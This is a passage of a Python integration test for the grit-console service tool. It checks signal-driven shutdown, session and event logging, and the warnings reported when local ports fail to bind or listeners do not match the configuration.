                sigint_service.get("pid") or
                sigint_service.get("managed_by")):
            print("foreground SIGINT did not persist stopped service state", file=sys.stderr)
            print(json.dumps(sigint_state_doc, indent=2), file=sys.stderr)
            return 1
        sigint_session_paths = list(sigint_sessions.glob("*/session.json"))
        if len(sigint_session_paths) != 1:
            print("foreground SIGINT did not write one session record", file=sys.stderr)
            return 1
        sigint_session_doc = json.loads(sigint_session_paths[0].read_text(encoding="utf-8"))
        if (sigint_session_doc.get("state") != "stopped" or
                sigint_session_doc.get("exit_reason") != "SIGINT"):
            print("foreground SIGINT session did not record exit reason", file=sys.stderr)
            print(json.dumps(sigint_session_doc, indent=2), file=sys.stderr)
            return 1
        sigint_events = [
            json.loads(line)
            for line in (sigint_session_paths[0].parent / "events.jsonl").read_text(encoding="utf-8").splitlines()
        ]
        sigint_stop_events = [
            event for event in sigint_events
            if event.get("event") == "service_stop"
        ]
        if (not sigint_stop_events or
                sigint_stop_events[-1].get("details", {}).get("reason") != "SIGINT" or
                sigint_stop_events[-1].get("details", {}).get("port") != sigint_port):
            print("foreground SIGINT service_stop event did not record reason and port", file=sys.stderr)
            return 1

        tui_owned_port = free_port()
        tui_owned_cfg = Path(tmp) / "server-config-tui-owned.json"
        tui_owned_state = Path(tmp) / "operator-session" / "tui-owned-state.json"
        tui_owned_staged = Path(tmp) / "operator-session" / "tui-owned-staged.json"
        tui_owned_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": tui_owned_port,
            "session_root": str(Path(tmp) / "sessions-tui-owned"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            "operator_session_dir": str(Path(tmp) / "operator-session"),
        }), encoding="utf-8")
        tui_master, tui_slave = pty.openpty()
        try:
            tui_owned_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(tui_owned_cfg),
                    "--state-file", str(tui_owned_state),
                    "--staged-file", str(tui_owned_staged),
                ],
                cwd=ROOT,
                stdin=tui_slave,
                stdout=tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(tui_slave)
            tui_slave = -1
            time.sleep(0.3)
            os.write(tui_master, b"4\n")
            tui_status_doc = None
            deadline = time.time() + 5
            while time.time() < deadline:
                tui_status = run(
                    "scripts/grit-console", "--config", str(tui_owned_cfg),
                    "--state-file", str(tui_owned_state),
                    "--staged-file", str(tui_owned_staged),
                    "--json-status",
                )
                if tui_status.returncode == 0:
                    tui_status_doc = json.loads(tui_status.stdout)
                    tui_rows = {row["name"]: row for row in tui_status_doc["services"]}
                    if tui_rows["file-service"]["actual"] == "listening":
                        break
                time.sleep(0.05)
            else:
                print("line console did not start managed file-service", file=sys.stderr)
                tui_owned_proc.terminate()
                tui_owned_proc.communicate(timeout=2)
                return 1
            os.write(tui_master, b"q\n")
            _tui_owned_stdout, tui_owned_stderr = tui_owned_proc.communicate(timeout=5)
            tui_owned_output = b""
            while True:
                try:
                    chunk = os.read(tui_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                tui_owned_output += chunk
        finally:
            if tui_slave != -1:
                os.close(tui_slave)
            try:
                os.close(tui_master)
            except OSError:
                pass
        if tui_owned_proc.returncode != 0 or "Traceback" in (tui_owned_stderr or ""):
            print("line console did not quit cleanly after starting managed service", file=sys.stderr)
            print(tui_owned_stderr or "", file=sys.stderr)
            return 1
        tui_owned_text = tui_owned_output.decode("utf-8", errors="replace")
        if "griTTYkit v" not in tui_owned_text or " events" not in tui_owned_text:
            print("line console summary did not report populated event counts", file=sys.stderr)
            print(tui_owned_text, file=sys.stderr)
            return 1
        if ("copy start" not in tui_owned_text or
                "copy the headless start command" not in tui_owned_text or
                "details: events service=file-service -n 3" not in tui_owned_text):
            print("line console service start did not expose transport command", file=sys.stderr)
            print(tui_owned_text, file=sys.stderr)
            return 1
        tui_after = run(
            "scripts/grit-console", "--config", str(tui_owned_cfg),
            "--state-file", str(tui_owned_state),
            "--staged-file", str(tui_owned_staged),
            "--json-status",
        )
        tui_after_doc = json.loads(tui_after.stdout)
        tui_after_rows = {row["name"]: row for row in tui_after_doc["services"]}
        if (tui_after_rows["file-service"]["actual"] == "listening" or
                tui_after_doc.get("server_state", {}).get("services", {}).get("file-service", {}).get("status") != "stopped" or
                tui_after_doc.get("server_state", {}).get("services", {}).get("workbench", {}).get("status") != "stopped"):
            print("line console quit did not stop services it started", file=sys.stderr)
            print(tui_after.stdout, file=sys.stderr)
            return 1
        try:
            with socket.create_connection(("127.0.0.1", tui_owned_port), timeout=0.2):
                print("line console-owned file-service port still listening after quit", file=sys.stderr)
                return 1
        except (ConnectionRefusedError, TimeoutError, OSError):
            pass
        tui_owned_events = [json.loads(line) for line in lifecycle_events_path.read_text(encoding="utf-8").splitlines()]
        if not any(
            event.get("service") == "file-service" and
            event.get("event") == "service_start_requested" and
            "--transport file-service" in event.get("details", {}).get("headless_command", "") and
            "--file-service-tls no" in event.get("details", {}).get("headless_command", "")
            for event in tui_owned_events
        ):
            print("line console service start did not log headless transport command", file=sys.stderr)
            return 1
        if not any(event.get("service") == "file-service" and event.get("event") == "service_stop" and event.get("details", {}).get("via") == "workbench-stop" for event in tui_owned_events):
            print("line console quit did not log workbench-owned service stop", file=sys.stderr)
            return 1

        tui_sigterm_owned_port = free_port()
        tui_sigterm_owned_operator_dir = Path(tmp) / "operator-session-tui-sigterm-owned"
        tui_sigterm_owned_cfg = Path(tmp) / "server-config-tui-sigterm-owned.json"
        tui_sigterm_owned_state = tui_sigterm_owned_operator_dir / "server-state.json"
        tui_sigterm_owned_staged = tui_sigterm_owned_operator_dir / "staged-files.json"
        tui_sigterm_owned_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": tui_sigterm_owned_port,
            "session_root": str(Path(tmp) / "sessions-tui-sigterm-owned"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            "operator_session_dir": str(tui_sigterm_owned_operator_dir),
        }), encoding="utf-8")
        sigterm_owned_master, sigterm_owned_slave = pty.openpty()
        try:
            tui_sigterm_owned_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(tui_sigterm_owned_cfg),
                    "--state-file", str(tui_sigterm_owned_state),
                    "--staged-file", str(tui_sigterm_owned_staged),
                ],
                cwd=ROOT,
                stdin=sigterm_owned_slave,
                stdout=sigterm_owned_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(sigterm_owned_slave)
            sigterm_owned_slave = -1
            time.sleep(0.3)
            os.write(sigterm_owned_master, b"4\n")
            deadline = time.time() + 5
            while time.time() < deadline:
                tui_sigterm_owned_status = run(
                    "scripts/grit-console", "--config", str(tui_sigterm_owned_cfg),
                    "--state-file", str(tui_sigterm_owned_state),
                    "--staged-file", str(tui_sigterm_owned_staged),
                    "--json-status",
                )
                if tui_sigterm_owned_status.returncode == 0:
                    tui_sigterm_owned_doc = json.loads(tui_sigterm_owned_status.stdout)
                    tui_sigterm_owned_rows = {row["name"]: row for row in tui_sigterm_owned_doc["services"]}
                    if tui_sigterm_owned_rows["file-service"]["actual"] == "listening":
                        break
                time.sleep(0.05)
            else:
                print("line console SIGTERM fixture did not start managed file-service", file=sys.stderr)
                tui_sigterm_owned_proc.terminate()
                tui_sigterm_owned_proc.communicate(timeout=2)
                return 1
            tui_sigterm_owned_proc.terminate()
            _tui_sigterm_owned_stdout, tui_sigterm_owned_stderr = tui_sigterm_owned_proc.communicate(timeout=5)
        finally:
            if sigterm_owned_slave != -1:
                os.close(sigterm_owned_slave)
            try:
                os.close(sigterm_owned_master)
            except OSError:
                pass
        if tui_sigterm_owned_proc.returncode not in (0, 130, 143, -signal.SIGTERM) or "Traceback" in (tui_sigterm_owned_stderr or ""):
            print("line console SIGTERM did not exit cleanly after starting managed service", file=sys.stderr)
            print(tui_sigterm_owned_stderr or "", file=sys.stderr)
            return 1
        tui_sigterm_owned_after = run(
            "scripts/grit-console", "--config", str(tui_sigterm_owned_cfg),
            "--state-file", str(tui_sigterm_owned_state),
            "--staged-file", str(tui_sigterm_owned_staged),
            "--json-status",
        )
        tui_sigterm_owned_after_doc = json.loads(tui_sigterm_owned_after.stdout)
        tui_sigterm_owned_after_rows = {row["name"]: row for row in tui_sigterm_owned_after_doc["services"]}
        tui_sigterm_owned_services = tui_sigterm_owned_after_doc.get("server_state", {}).get("services", {})
        if (tui_sigterm_owned_after_rows["file-service"]["actual"] == "listening" or
                tui_sigterm_owned_services.get("file-service", {}).get("status") != "stopped" or
                tui_sigterm_owned_services.get("file-service", {}).get("stopped_reason") != "workbench-stop:SIGTERM" or
                tui_sigterm_owned_services.get("workbench", {}).get("stopped_reason") != "SIGTERM"):
            print("line console SIGTERM did not stop services it started with SIGTERM state", file=sys.stderr)
            print(tui_sigterm_owned_after.stdout, file=sys.stderr)
            return 1
        try:
            with socket.create_connection(("127.0.0.1", tui_sigterm_owned_port), timeout=0.2):
                print("line console SIGTERM-owned file-service port still listening", file=sys.stderr)
                return 1
        except (ConnectionRefusedError, TimeoutError, OSError):
            pass
        tui_sigterm_owned_events = [
            json.loads(line) for line in (tui_sigterm_owned_operator_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
        ]
        if not any(
                event.get("service") == "file-service" and
                event.get("event") == "service_stop" and
                event.get("details", {}).get("via") == "workbench-stop" and
                event.get("details", {}).get("reason") == "SIGTERM" and
                event.get("details", {}).get("port_released") is True
                for event in tui_sigterm_owned_events):
            print("line console SIGTERM did not log workbench-owned service stop with port release", file=sys.stderr)
            return 1

        tui_sigterm_operator_dir = Path(tmp) / "operator-session-tui-sigterm"
        tui_sigterm_cfg = Path(tmp) / "server-config-tui-sigterm.json"
        tui_sigterm_state = tui_sigterm_operator_dir / "server-state.json"
        tui_sigterm_staged = tui_sigterm_operator_dir / "staged-files.json"
        tui_sigterm_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": free_port(),
            "session_root": str(Path(tmp) / "sessions-tui-sigterm"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            "operator_session_dir": str(tui_sigterm_operator_dir),
        }), encoding="utf-8")
        sigterm_master, sigterm_slave = pty.openpty()
        try:
            tui_sigterm_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(tui_sigterm_cfg),
                    "--state-file", str(tui_sigterm_state),
                    "--staged-file", str(tui_sigterm_staged),
                ],
                cwd=ROOT,
                stdin=sigterm_slave,
                stdout=sigterm_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(sigterm_slave)
            sigterm_slave = -1
            deadline = time.time() + 5
            while time.time() < deadline:
                sigterm_status = run(
                    "scripts/grit-console", "--config", str(tui_sigterm_cfg),
                    "--state-file", str(tui_sigterm_state),
                    "--staged-file", str(tui_sigterm_staged),
                    "--json-status",
                )
                if sigterm_status.returncode == 0:
                    sigterm_doc = json.loads(sigterm_status.stdout)
                    if (sigterm_doc.get("server_state", {}).get("services", {}).get("workbench") or {}).get("status") == "open":
                        break
                time.sleep(0.05)
            else:
                print("line console SIGTERM fixture did not reach open state", file=sys.stderr)
                tui_sigterm_proc.terminate()
                tui_sigterm_proc.communicate(timeout=2)
                return 1
            tui_sigterm_proc.terminate()
            _tui_sigterm_stdout, tui_sigterm_stderr = tui_sigterm_proc.communicate(timeout=5)
        finally:
            if sigterm_slave != -1:
                os.close(sigterm_slave)
            try:
                os.close(sigterm_master)
            except OSError:
                pass
        if tui_sigterm_proc.returncode not in (0, 130, 143, -signal.SIGTERM) or "Traceback" in (tui_sigterm_stderr or ""):
            print("line console did not exit cleanly on SIGTERM while waiting for input", file=sys.stderr)
            print(tui_sigterm_stderr or "", file=sys.stderr)
            return 1
        tui_sigterm_after = run(
            "scripts/grit-console", "--config", str(tui_sigterm_cfg),
            "--state-file", str(tui_sigterm_state),
            "--staged-file", str(tui_sigterm_staged),
            "--json-status",
        )
        tui_sigterm_doc = json.loads(tui_sigterm_after.stdout)
        tui_sigterm_workbench = tui_sigterm_doc.get("server_state", {}).get("services", {}).get("workbench") or {}
        if tui_sigterm_workbench.get("status") != "stopped" or tui_sigterm_workbench.get("stopped_reason") != "SIGTERM":
            print("line console SIGTERM did not mark workbench stopped with SIGTERM reason", file=sys.stderr)
            print(tui_sigterm_after.stdout, file=sys.stderr)
            return 1
        tui_sigterm_events = [
            json.loads(line) for line in (tui_sigterm_operator_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
        ]
        if not any(event.get("service") == "workbench" and event.get("event") == "shutdown" and event.get("details", {}).get("reason") == "SIGTERM" for event in tui_sigterm_events):
            print("line console SIGTERM did not write structured workbench shutdown event", file=sys.stderr)
            return 1

        bind_fail_port = free_port()
        bind_fail_cfg = Path(tmp) / "server-config-bind-fail.json"
        bind_fail_state = Path(tmp) / "operator-session" / "bind-fail-state.json"
        bind_fail_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": bind_fail_port,
            "session_root": str(Path(tmp) / "sessions-bind-fail"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            "operator_session_dir": str(Path(tmp) / "operator-session"),
        }), encoding="utf-8")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as blocker:
            blocker.bind(("127.0.0.1", bind_fail_port))
            blocker.listen(1)
            bind_fail = run(
                "scripts/grit-console", "--config", str(bind_fail_cfg),
                "--state-file", str(bind_fail_state),
                "--staged-file", str(lifecycle_staged),
                "--transport", "file-service",
                "--file-service-tls", "no",
                "--timeout", "0.05",
            )
        combined_bind = bind_fail.stdout + bind_fail.stderr
        if bind_fail.returncode == 0 or "Traceback" in combined_bind or "unable to bind" not in combined_bind:
            print("bind failure was not reported cleanly", file=sys.stderr)
            print(combined_bind, file=sys.stderr)
            return 1
        state_after_bind = json.loads(bind_fail_state.read_text(encoding="utf-8"))
        if state_after_bind["services"]["file-service"].get("status") != "error":
            print("bind failure did not mark service error", file=sys.stderr)
            return 1
        bind_fail_owners = state_after_bind["services"]["file-service"].get("owners") or []
        if not bind_fail_owners:
            print("bind failure did not record possible listener owners", file=sys.stderr)
            return 1
        if (not bind_fail_owners[-1].get("process_name") or
                not bind_fail_owners[-1].get("exe") or
                "cmdline" not in bind_fail_owners[-1] or
                "process=" not in combined_bind or
                "exe=" not in combined_bind or
                "cmdline=" not in combined_bind):
            print("bind failure did not record structured owner process details", file=sys.stderr)
            print(combined_bind, file=sys.stderr)
            print(json.dumps(bind_fail_owners, indent=2), file=sys.stderr)
            return 1
        command_queue_bind_state = Path(tmp) / "operator-session" / "command-queue-bind-fail-state.json"
        command_queue_bind_cfg = Path(tmp) / "server-config-command-queue-bind-fail.json"
        command_queue_bind_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_COMMAND_QUEUE_PORT": bind_fail_port,
            "GRIT_COMMAND_QUEUE_TLS": "no",
            "session_root": str(Path(tmp) / "sessions-command-queue-bind-fail"),
            "operator_session_dir": str(Path(tmp) / "operator-session"),
        }), encoding="utf-8")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as blocker:
            blocker.bind(("127.0.0.1", bind_fail_port))
            blocker.listen(1)
            command_queue_bind_fail = run(
                "scripts/grit-console", "--config", str(command_queue_bind_cfg),
                "--state-file", str(command_queue_bind_state),
                "--transport", "command-queue",
                "--timeout", "0.05",
            )
        command_queue_bind_combined = command_queue_bind_fail.stdout + command_queue_bind_fail.stderr
        command_queue_bind_doc = json.loads(command_queue_bind_state.read_text(encoding="utf-8"))
        if (command_queue_bind_fail.returncode == 0 or
                "Traceback" in command_queue_bind_combined or
                "unable to bind" not in command_queue_bind_combined or
                command_queue_bind_doc["services"]["command-queue"].get("status") != "error"):
            print("command-queue bind failure was not preserved as a service error", file=sys.stderr)
            print(command_queue_bind_combined, file=sys.stderr)
            print(json.dumps(command_queue_bind_doc, indent=2), file=sys.stderr)
            return 1
        bind_fail_status = run(
            "scripts/grit-console", "--config", str(bind_fail_cfg),
            "--state-file", str(bind_fail_state),
            "--staged-file", str(lifecycle_staged),
            "--json-status",
        )
        bind_fail_doc = json.loads(bind_fail_status.stdout)
        bind_fail_warnings = [
            item for item in bind_fail_doc.get("warnings", [])
            if item.get("type") == "service_error" and item.get("service") == "file-service"
        ]
        bind_fail_service = (bind_fail_doc.get("services_by_name") or {}).get("file-service") or {}
        bind_fail_port_rows = (bind_fail_doc.get("ports_by_number") or {}).get(str(bind_fail_port)) or []
        bind_fail_port_row = next((row for row in bind_fail_port_rows if row.get("service") == "file-service"), {})
        bind_fail_services_api = (bind_fail_doc.get("api_collections") or {}).get("services") or {}
        bind_fail_ports_api = (bind_fail_doc.get("api_collections") or {}).get("ports") or {}
        if (not bind_fail_warnings or
                not bind_fail_warnings[-1].get("error") or
                bind_fail_warnings[-1].get("severity") != "error" or
                bind_fail_warnings[-1].get("remediation_class") != "stop_or_reconfigure_service" or
                bind_fail_warnings[-1].get("requires_operator_action") is not True or
                bind_fail_warnings[-1].get("bind_address") != "127.0.0.1" or
                bind_fail_warnings[-1].get("port") != bind_fail_port or
                not bind_fail_warnings[-1].get("owners") or
                not bind_fail_warnings[-1].get("owners", [{}])[-1].get("process_name") or
                not bind_fail_warnings[-1].get("owners", [{}])[-1].get("exe") or
                "cmdline" not in bind_fail_warnings[-1].get("owners", [{}])[-1] or
                bind_fail_service.get("warning_count") != 1 or
                "service_error" not in bind_fail_service.get("warning_types", []) or
                bind_fail_port_row.get("warning_count") != 1 or
                "service_error" not in bind_fail_port_row.get("warning_types", []) or
                bind_fail_doc.get("services_by_has_warnings", {}).get("yes", [{}])[-1].get("name") != "file-service" or
                bind_fail_doc.get("services_by_warning_type", {}).get("service_error", [{}])[-1].get("name") != "file-service" or
                bind_fail_doc.get("ports_by_has_warnings", {}).get("yes", [{}])[-1].get("service") != "file-service" or
                bind_fail_doc.get("ports_by_warning_type", {}).get("service_error", [{}])[-1].get("service") != "file-service" or
                "services_by_has_warnings" not in (bind_fail_services_api.get("indexes") or []) or
                "services_by_warning_type" not in (bind_fail_services_api.get("indexes") or []) or
                "ports_by_has_warnings" not in (bind_fail_ports_api.get("indexes") or []) or
                "ports_by_warning_type" not in (bind_fail_ports_api.get("indexes") or [])):
            print("bind failure status warning missing bind/error/owner context", file=sys.stderr)
            print(bind_fail_status.stdout, file=sys.stderr)
            return 1
        bind_warning_stats = bind_fail_doc.get("warning_stats") or {}
        bind_summary = bind_fail_doc.get("summary") or {}
        if (bind_warning_stats.get("total_count", 0) < 1 or
                bind_warning_stats.get("by_type", {}).get("service_error", 0) < 1 or
                bind_warning_stats.get("by_severity", {}).get("error", 0) < 1 or
                bind_warning_stats.get("by_remediation_class", {}).get("stop_or_reconfigure_service", 0) < 1 or
                bind_warning_stats.get("by_type_severity", {}).get("service_error:error", 0) < 1 or
                bind_warning_stats.get("by_service", {}).get("file-service", 0) < 1 or
                bind_warning_stats.get("by_port", {}).get(str(bind_fail_port), 0) < 1 or
                bind_summary.get("warning_count", 0) < 1 or
                bind_summary.get("warning_type_counts", {}).get("service_error", 0) < 1 or
                bind_summary.get("warning_severity_counts", {}).get("error", 0) < 1 or
                bind_summary.get("warning_remediation_class_counts", {}).get("stop_or_reconfigure_service", 0) < 1 or
                bind_summary.get("warning_type_severity_counts", {}).get("service_error:error", 0) < 1 or
                bind_summary.get("warning_service_counts", {}).get("file-service", 0) < 1 or
                bind_summary.get("warning_port_counts", {}).get(str(bind_fail_port), 0) < 1 or
                bind_summary.get("service_warning_count", 0) < 1 or
                bind_summary.get("service_warning_type_counts", {}).get("service_error", 0) < 1 or
                bind_summary.get("port_warning_count", 0) < 1 or
                bind_summary.get("port_warning_type_counts", {}).get("service_error", 0) < 1):
            print("bind failure status missing warning aggregate stats", file=sys.stderr)
            print(bind_fail_status.stdout, file=sys.stderr)
            return 1
        warnings_by_type = bind_fail_doc.get("warnings_by_type") or {}
        warnings_by_severity = bind_fail_doc.get("warnings_by_severity") or {}
        warnings_by_remediation_class = bind_fail_doc.get("warnings_by_remediation_class") or {}
        warnings_by_type_severity = bind_fail_doc.get("warnings_by_type_severity") or {}
        warnings_by_service = bind_fail_doc.get("warnings_by_service") or {}
        warnings_by_port = bind_fail_doc.get("warnings_by_port") or {}
        if (not warnings_by_type.get("service_error") or
                warnings_by_type["service_error"][-1].get("service") != "file-service" or
                not any(item.get("type") == "service_error" for item in warnings_by_severity.get("error", [])) or
                not any(item.get("service") == "file-service" for item in warnings_by_remediation_class.get("stop_or_reconfigure_service", [])) or
                not any(item.get("port") == bind_fail_port for item in warnings_by_type_severity.get("service_error:error", [])) or
                not warnings_by_service.get("file-service") or
                warnings_by_service["file-service"][-1].get("type") != "service_error" or
                not warnings_by_port.get(str(bind_fail_port)) or
                warnings_by_port[str(bind_fail_port)][-1].get("type") != "service_error"):
            print("bind failure status missing warning lookup indexes", file=sys.stderr)
            print(bind_fail_status.stdout, file=sys.stderr)
            return 1
        owner_pid = str((bind_fail_warnings[-1].get("owners") or [{}])[-1].get("pid") or "")
        warnings_by_owner_pid = bind_fail_doc.get("warnings_by_owner_pid") or {}
        if (not owner_pid or
                bind_warning_stats.get("by_owner_pid", {}).get(owner_pid, 0) < 1 or
                bind_summary.get("warning_owner_pid_counts", {}).get(owner_pid, 0) < 1 or
                not warnings_by_owner_pid.get(owner_pid) or
                warnings_by_owner_pid[owner_pid][-1].get("service") != "file-service"):
            print("bind failure status missing warning owner-pid index", file=sys.stderr)
            print(bind_fail_status.stdout, file=sys.stderr)
            return 1
        service_port_key = f"file-service:{bind_fail_port}"
        type_service_port_key = f"service_error:{service_port_key}"
        if (bind_warning_stats.get("by_service_port", {}).get(service_port_key, 0) < 1 or
                bind_warning_stats.get("by_type_service_port", {}).get(type_service_port_key, 0) < 1 or
                bind_summary.get("warning_service_port_counts", {}).get(service_port_key, 0) < 1 or
                bind_summary.get("warning_type_service_port_counts", {}).get(type_service_port_key, 0) < 1 or
                bind_fail_doc.get("warnings_by_service_port", {}).get(service_port_key, [{}])[-1].get("type") != "service_error" or
                bind_fail_doc.get("warnings_by_type_service_port", {}).get(type_service_port_key, [{}])[-1].get("service") != "file-service"):
            print("bind failure status missing service:port warning indexes", file=sys.stderr)
            print(bind_fail_status.stdout, file=sys.stderr)
            return 1
        warning_api = (bind_fail_doc.get("api_collections") or {}).get("warnings") or {}
        if ("warnings_by_severity" not in (warning_api.get("indexes") or []) or
                "warnings_by_remediation_class" not in (warning_api.get("indexes") or []) or
                "warnings_by_type_severity" not in (warning_api.get("indexes") or [])):
            print("bind failure status missing warning classification API indexes", file=sys.stderr)
            print(bind_fail_status.stdout, file=sys.stderr)
            return 1
        bind_fail_text_status = run(
            "scripts/grit-console", "--config", str(bind_fail_cfg),
            "--state-file", str(bind_fail_state),
            "--staged-file", str(lifecycle_staged),
            "--status",
        )
        if (f"file-service bind=127.0.0.1 port={bind_fail_port}" not in bind_fail_text_status.stdout or
                "configured=error" not in bind_fail_text_status.stdout or
                "warnings=1:service_error" not in bind_fail_text_status.stdout or
                "Warning summary:" not in bind_fail_text_status.stdout or
                "service_error=1" not in bind_fail_text_status.stdout or
                "services=file-service=1" not in bind_fail_text_status.stdout or
                "recorded_owner_pid=" not in bind_fail_text_status.stdout or
                "process=" not in bind_fail_text_status.stdout or
                "exe=" not in bind_fail_text_status.stdout or
                "cmdline=" not in bind_fail_text_status.stdout or
                f"ports={bind_fail_port}=1" not in bind_fail_text_status.stdout):
            print("bind failure text status missing inline service warning badge", file=sys.stderr)
            print(bind_fail_text_status.stdout, file=sys.stderr)
            return 1
        bind_fail_workbench = run(
            "scripts/grit-console", "--config", str(bind_fail_cfg),
            "--state-file", str(bind_fail_state),
        )
        if ("Warnings:" not in bind_fail_workbench.stdout or
                "service_error file-service" not in bind_fail_workbench.stdout or
                "unable to bind" not in bind_fail_workbench.stdout or
                f"bind: 127.0.0.1:{bind_fail_port}" not in bind_fail_workbench.stdout or
                "owner_pid=" not in bind_fail_workbench.stdout or
                "process=" not in bind_fail_workbench.stdout or
                "exe=" not in bind_fail_workbench.stdout or
                "cmdline=" not in bind_fail_workbench.stdout or
                "suggested_action:" not in bind_fail_workbench.stdout or
                "Warning summary:" not in bind_fail_workbench.stdout or
                "service_error=1" not in bind_fail_workbench.stdout or
                "services=file-service=1" not in bind_fail_workbench.stdout or
                f"ports={bind_fail_port}=1" not in bind_fail_workbench.stdout or
                "error=" not in bind_fail_workbench.stdout or
                "file-service:bind_error" not in bind_fail_workbench.stdout):
            print("workbench did not surface bind failure warnings", file=sys.stderr)
            print(bind_fail_workbench.stdout, file=sys.stderr)
            return 1
        bind_events_path = Path(tmp) / "operator-session" / "events.jsonl"
        bind_events = [json.loads(line) for line in bind_events_path.read_text(encoding="utf-8").splitlines()]
        bind_error = [
            event for event in bind_events
            if event.get("event") == "bind_error" and event.get("service") == "file-service"
        ]
        if not bind_error:
            print("bind failure did not write structured bind_error event", file=sys.stderr)
            return 1
        if bind_error[-1].get("service") != "file-service" or bind_error[-1].get("level") != "error":
            print("bind_error event missing service/error level", file=sys.stderr)
            return 1
        if bind_error[-1].get("details", {}).get("port") != bind_fail_port:
            print("bind_error event missing failed port", file=sys.stderr)
            return 1

        unexpected_state = {
            "schema": 1,
            "services": {
                "file-service": {
                    "status": "stopped",
                    "pid": "",
                    "listen_host": "127.0.0.1",
                    "GRIT_OPERATOR_FILE_SERVICE_PORT": bind_fail_port,
                    "updated_at": "unexpected-listener",
                }
            },
            "sessions": [],
        }
        bind_fail_state.write_text(json.dumps(unexpected_state, indent=2) + "\n", encoding="utf-8")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as blocker:
            blocker.bind(("127.0.0.1", bind_fail_port))
            blocker.listen(1)
            unexpected_status = run(
                "scripts/grit-console", "--config", str(bind_fail_cfg),
                "--state-file", str(bind_fail_state),
                "--staged-file", str(lifecycle_staged),
                "--status",
            )
            if "actual listener detected while configured state is not listening" not in unexpected_status.stdout:
                print("--status did not warn on unexpected actual listener", file=sys.stderr)
                print(unexpected_status.stdout, file=sys.stderr)
                return 1
            unexpected_json = run(
                "scripts/grit-console", "--config", str(bind_fail_cfg),
                "--state-file", str(bind_fail_state),
                "--staged-file", str(lifecycle_staged),
                "--json-status",
            )
            unexpected_doc = json.loads(unexpected_json.stdout)
            unexpected_warnings = [
                item for item in unexpected_doc.get("warnings", [])
                if item.get("type") == "unexpected_listener" and item.get("service") == "file-service"
            ]
            if (not unexpected_warnings or
                    not unexpected_warnings[-1].get("listener_pids") or
                    unexpected_warnings[-1].get("configured") != "stopped" or
                    unexpected_warnings[-1].get("actual") != "listening"):
                print("--json-status did not expose structured unexpected listener warning", file=sys.stderr)
                print(unexpected_json.stdout, file=sys.stderr)
                return 1

        bind_mismatch_port = free_port()
        bind_mismatch_cfg = Path(tmp) / "server-config-bind-mismatch.json"
        bind_mismatch_state = Path(tmp) / "operator-session" / "bind-mismatch-state.json"
        bind_mismatch_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.2",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": bind_mismatch_port,
            "session_root": str(Path(tmp) / "sessions-bind-mismatch"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            "operator_session_dir": str(Path(tmp) / "operator-session"),
        }), encoding="utf-8")
        bind_mismatch_state.write_text(json.dumps({
            "schema": 1,
            "services": {
                "file-service": {
                    "status": "stopped",
                    "pid": "",
                    "listen_host": "127.0.0.2",
                    "GRIT_OPERATOR_FILE_SERVICE_PORT": bind_mismatch_port,
                    "updated_at": "bind-mismatch",
                }
            },
            "sessions": [],
        }, indent=2) + "\n", encoding="utf-8")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as blocker:
            blocker.bind(("127.0.0.1", bind_mismatch_port))
            blocker.listen(1)
            bind_mismatch_text = run(
                "scripts/grit-console", "--config", str(bind_mismatch_cfg),
                "--state-file", str(bind_mismatch_state),
                "--staged-file", str(lifecycle_staged),
                "--status",
            )
            if "listener found on configured port but not configured bind address" not in bind_mismatch_text.stdout:
                print("--status did not warn on listener bind-address mismatch", file=sys.stderr)
                print(bind_mismatch_text.stdout, file=sys.stderr)
                return 1
            bind_mismatch_json = run(
                "scripts/grit-console", "--config", str(bind_mismatch_cfg),
                "--state-file", str(bind_mismatch_state),
                "--staged-file", str(lifecycle_staged),
                "--json-status",
            )
            bind_mismatch_doc = json.loads(bind_mismatch_json.stdout)
            bind_mismatch_service = (bind_mismatch_doc.get("services_by_name") or {}).get("file-service") or {}
            bind_mismatch_warnings = [
                item for item in bind_mismatch_doc.get("warnings", [])
                if item.get("type") == "listener_bind_mismatch" and item.get("service") == "file-service"
            ]
            if (bind_mismatch_service.get("actual") != "stopped" or
                    not bind_mismatch_service.get("listener_endpoints") or
                    bind_mismatch_service.get("matching_listener_endpoints") or
                    not bind_mismatch_warnings or
                    bind_mismatch_warnings[-1].get("bind_address") != "127.0.0.2" or
                    bind_mismatch_warnings[-1].get("actual") != "stopped"):
                print("--json-status did not expose listener bind-address mismatch", file=sys.stderr)
                print(bind_mismatch_json.stdout, file=sys.stderr)
                return 1

        state_after_bind["services"]["file-service"].update({"status": "listening", "pid": 999999, "updated_at": "stale"})
